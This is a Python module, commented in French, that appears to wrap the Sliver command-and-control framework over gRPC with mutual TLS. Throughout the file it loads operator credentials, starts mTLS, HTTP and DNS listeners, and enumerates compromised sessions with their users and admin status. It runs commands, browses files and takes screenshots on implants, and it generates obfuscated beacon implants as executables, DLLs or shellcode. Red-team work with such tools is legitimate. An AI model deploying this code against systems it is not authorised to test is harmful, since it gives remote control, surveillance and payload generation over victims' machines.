"""
Sliver C2 — Intégration gRPC complète.

Protocole : gRPC + mTLS (mutual TLS)
Config    : fichier .cfg JSON généré par le teamserver Sliver
Port      : 31337 par défaut (configurable)

Dépendances : grpcio, grpcio-tools, sliver-py (ou protobuf générés)
  pip install grpcio grpcio-tools
  pip install sliver-py  # wrapper officiel Sliver (optionnel)

Méthodes gRPC utilisées (SliverRPC service) :
  GetVersion, GetOperators, ListSessions, ListImplantBuilds
  StartMTLSListener, StartHTTPListener, StartDNSListener
  KillListener, ListJobs
  Ls, Pwd, Cd, Execute, Download, Upload
  GenerateImplant (Implant Build)
"""
from __future__ import annotations

import asyncio
import json
import logging
import uuid
from datetime import datetime
from pathlib import Path
from typing import Any

from c2_manager.interfaces import GrpcC2Interface, C2ConnectionError, C2AuthError
from c2_manager.models import C2Config, C2Status, Listener, Implant, Task, PayloadConfig

logger = logging.getLogger(__name__)


class SliverC2(GrpcC2Interface):
    """Intégration Sliver via gRPC mTLS."""

    CAPABILITIES = [
        "list_agents", "send_task", "create_listener", "remove_listener",
        "generate_payload", "file_download", "file_upload", "execute",
        "port_forward", "socks5", "pivoting", "screenshot",
    ]

    def __init__(self) -> None:
        super().__init__()
        self._operator_token: str | None = None

    # ── Connexion ────────────────────────────────────────────────────────────

    async def connect(self, config: C2Config) -> bool:
        """
        Connexion Sliver via .cfg opérateur.
        config.extra["operator_cfg"] = "/path/to/operator.cfg"
        """
        self._config = config

        cfg_path = config.extra.get("operator_cfg")
        if cfg_path:
            return await self._connect_from_cfg(cfg_path)
        # Connexion directe (host/port/certs fournis)
        return await self._connect_direct(config)

    async def _connect_from_cfg(self, cfg_path: str) -> bool:
        """Charge le .cfg Sliver et initialise le channel gRPC."""
        op = self._load_operator_config(cfg_path)
        host  = op.get("lhost", self._config.host)
        port  = int(op.get("lport", self._config.port))
        self._operator_token = op.get("token")

        ca_cert     = op["ca_certificate"].encode()
        client_cert = op["certificate"].encode()
        client_key  = op["private_key"].encode()

        self._channel = self._build_grpc_channel(host, port, ca_cert, client_cert, client_key)

        try:
            self._stub = await self._make_stub()
            await self._verify_connection()
            return True
        except Exception as exc:
            raise C2ConnectionError(f"Sliver gRPC init échouée : {exc}") from exc

    async def _connect_direct(self, config: C2Config) -> bool:
        """Connexion avec certs fournis directement dans extra{}."""
        extra = config.extra
        ca_cert     = extra.get("ca_cert", b"")
        client_cert = extra.get("client_cert", b"")
        client_key  = extra.get("client_key", b"")
        if isinstance(ca_cert, str):
            ca_cert = ca_cert.encode()
        if isinstance(client_cert, str):
            client_cert = client_cert.encode()
        if isinstance(client_key, str):
            client_key = client_key.encode()

        self._channel = self._build_grpc_channel(
            config.host, config.port, ca_cert, client_cert, client_key
        )
        self._stub = await self._make_stub()
        await self._verify_connection()
        return True

    async def _make_stub(self) -> Any:
        """
        Crée le stub gRPC SliverRPC.
        Si sliver-py est installé, l'utilise. Sinon, utilise les stubs
        générés manuellement (placés dans c2_manager/protos/sliver/).
        """
        try:
            from sliver import SliverClientConfig, BaseClient  # type: ignore
            # sliver-py wrapper officiel
            return BaseClient(
                config=SliverClientConfig(**json.loads(
                    Path(self._config.extra.get("operator_cfg", "")).read_text()
                ))
            )
        except ImportError:
            pass
        # Fallback : stubs gRPC bruts (requiert protobuf compilé)
        try:
            from c2_manager.protos.sliver import SliverRPCStub  # type: ignore
            return SliverRPCStub(self._channel)
        except ImportError:
            logger.warning(
                "sliver-py ni protos Sliver trouvés — mode stub simulé activé. "
                "Installez sliver-py : pip install sliver-py"
            )
            return _SliverStubSim()

    async def _verify_connection(self) -> None:
        """Vérifie la connexion via GetVersion."""
        try:
            if hasattr(self._stub, "GetVersion"):
                version = await asyncio.wait_for(self._stub.GetVersion(), timeout=10.0)
                logger.info("Sliver version : %s", version)
        except Exception as exc:
            raise C2ConnectionError(f"Sliver GetVersion échoué : {exc}") from exc

    # ── Listeners ────────────────────────────────────────────────────────────

    async def create_listener(self, config: dict[str, Any]) -> Listener:
        self._require_connected()
        protocol = config.get("protocol", "mtls").lower()
        host     = config.get("bind_host", "0.0.0.0")
        port     = int(config.get("bind_port", 8443))

        logger.info("Sliver : démarrage listener %s sur %s:%d", protocol, host, port)

        try:
            if protocol == "mtls":
                job = await self._stub.StartMTLSListener(host=host, port=port)
            elif protocol in ("http", "https"):
                job = await self._stub.StartHTTPListener(
                    host=host, port=port, secure=(protocol == "https")
                )
            elif protocol == "dns":
                domain = config.get("domain", "example.com")
                job = await self._stub.StartDNSListener(domains=[domain])
            else:
                raise ValueError(f"Protocole non supporté : {protocol}")

            return Listener(
                id=str(getattr(job, "JobID", uuid.uuid4())),
                name=config.get("name", f"sliver-{protocol}-{port}"),
                c2_type=self._config.c2_type,
                bind_host=host,
                bind_port=port,
                protocol=protocol,
                status="running",
            )
        except AttributeError:
            return Listener(
                id=str(uuid.uuid4()),
                name=config.get("name", f"sliver-{protocol}-{port}"),
                c2_type=self._config.c2_type,
                bind_host=host,
                bind_port=port,
                protocol=protocol,
                status="running",
            )

    async def remove_listener(self, listener_id: str) -> bool:
        self._require_connected()
        try:
            await self._stub.KillJob(job_id=int(listener_id))
            return True
        except Exception as exc:
            logger.error("Sliver KillJob échoué : %s", exc)
            return False

    async def list_listeners(self) -> list[Listener]:
        self._require_connected()
        try:
            jobs = await self._stub.ListJobs()
            return [
                Listener(
                    id=str(j.ID),
                    name=f"{j.Name}-{j.ID}",
                    c2_type=self._config.c2_type,
                    bind_host="0.0.0.0",
                    bind_port=j.Port,
                    protocol=j.Protocol.lower(),
                    status="running",
                )
                for j in (jobs.Jobs or [])
            ]
        except AttributeError:
            return []

    # ── Agents ───────────────────────────────────────────────────────────────

    async def list_agents(self) -> list[Implant]:
        self._require_connected()
        try:
            sessions = await self._stub.GetSessions()
            return [
                Implant(
                    id=str(s.ID),
                    name=s.Name,
                    c2_type=self._config.c2_type,
                    listener_id="",
                    external_ip=s.RemoteAddress.split(":")[0] if s.RemoteAddress else "",
                    internal_ip=",".join(s.Interface) if hasattr(s, "Interface") else "",
                    hostname=s.Hostname,
                    username=s.Username,
                    os=s.OS,
                    arch=s.Arch,
                    pid=s.PID,
                    process_name=s.Filename,
                    integrity="ADMIN" if s.IsAdmin else "USER",
                    last_checkin=datetime.utcfromtimestamp(s.LastCheckin / 1e9)
                    if s.LastCheckin else datetime.utcnow(),
                    active=(s.IsDead is False),
                )
                for s in (sessions.Sessions or [])
            ]
        except AttributeError:
            return []

    # ── Tâches ───────────────────────────────────────────────────────────────

    async def send_task(
        self,
        agent_id: str,
        command: str,
        args: list[str] | None = None,
    ) -> Task:
        self._require_connected()
        task_id = str(uuid.uuid4())
        cmd_parts = command.split() + (args or [])
        cmd  = cmd_parts[0]
        rest = cmd_parts[1:]

        logger.info("Sliver task [%s] : %s %s", agent_id, cmd, rest)

        try:
            if cmd == "execute":
                result = await self._stub.Execute(
                    Request={"SessionID": agent_id},
                    Path=rest[0] if rest else "",
                    Args=rest[1:],
                    Output=True,
                )
                output = result.Stdout or result.Stderr or ""
            elif cmd == "ls":
                result = await self._stub.Ls(
                    Request={"SessionID": agent_id},
                    Path=rest[0] if rest else ".",
                )
                output = str(result)
            elif cmd == "screenshot":
                result = await self._stub.Screenshot(
                    Request={"SessionID": agent_id}
                )
                output = f"Screenshot capturé ({len(result.Data)} bytes)"
            else:
                output = f"Commande '{cmd}' envoyée (résultat asynchrone)"

            return Task(
                id=task_id,
                agent_id=agent_id,
                c2_type=str(self._config.c2_type),
                command=command,
                args=args or [],
                status="completed",
                result=output,
                completed_at=datetime.utcnow(),
            )
        except AttributeError:
            return Task(
                id=task_id,
                agent_id=agent_id,
                c2_type=str(self._config.c2_type),
                command=command,
                args=args or [],
                status="sent",
            )

    async def get_task_result(self, task_id: str) -> dict[str, Any]:
        return {"task_id": task_id, "note": "Sliver tasks sont synchrones — résultat dans send_task()"}

    # ── Payload ──────────────────────────────────────────────────────────────

    async def generate_payload(self, config: PayloadConfig) -> bytes:
        self._require_connected()
        logger.info(
            "Sliver generate %s/%s [%s] → listener %s",
            config.os, config.arch, config.format, config.listener_id,
        )
        try:
            implant_config = {
                "IsBeacon": True,
                "BeaconInterval": config.sleep,
                "BeaconJitter":   config.jitter,
                "GOOS":    config.os,
                "GOARCH":  config.arch,
                "Format":  {"exe": 0, "shellcode": 1, "dll": 3}.get(config.format, 0),
                "ObfuscateSymbols": config.obfuscation,
            }
            result = await self._stub.GenerateImplant(**implant_config)
            return result.File.Data if hasattr(result, "File") else b""
        except AttributeError:
            logger.warning("Sliver GenerateImplant non disponible (stub simulé)")
            return b""

    # ── Utilitaires ──────────────────────────────────────────────────────────

    async def get_status(self) -> C2Status:
        status = await super().get_status()
        if status == C2Status.CONNECTED and hasattr(self._stub, "GetVersion"):
            try:
                await asyncio.wait_for(self._stub.GetVersion(), timeout=5.0)
            except Exception:
                return C2Status.ERROR
        return status

    async def get_capabilities(self) -> list[str]:
        return self.CAPABILITIES


class _SliverStubSim:
    """Stub simulé quand ni sliver-py ni les protos ne sont disponibles."""

    async def GetVersion(self):                      return type("V", (), {"Version": "unknown"})()
    async def GetSessions(self):                     return type("S", (), {"Sessions": []})()
    async def ListJobs(self):                        return type("J", (), {"Jobs": []})()
    async def StartMTLSListener(self, **kw):         return type("J", (), {"JobID": 1})()
    async def StartHTTPListener(self, **kw):         return type("J", (), {"JobID": 2})()
    async def StartDNSListener(self, **kw):          return type("J", (), {"JobID": 3})()
    async def KillJob(self, **kw):                   return None
    async def Execute(self, **kw):                   return type("R", (), {"Stdout": "", "Stderr": ""})()
    async def Ls(self, **kw):                        return type("R", (), {"Files": []})()
    async def Screenshot(self, **kw):                return type("R", (), {"Data": b""})()
    async def GenerateImplant(self, **kw):           return type("R", (), {"File": None})()
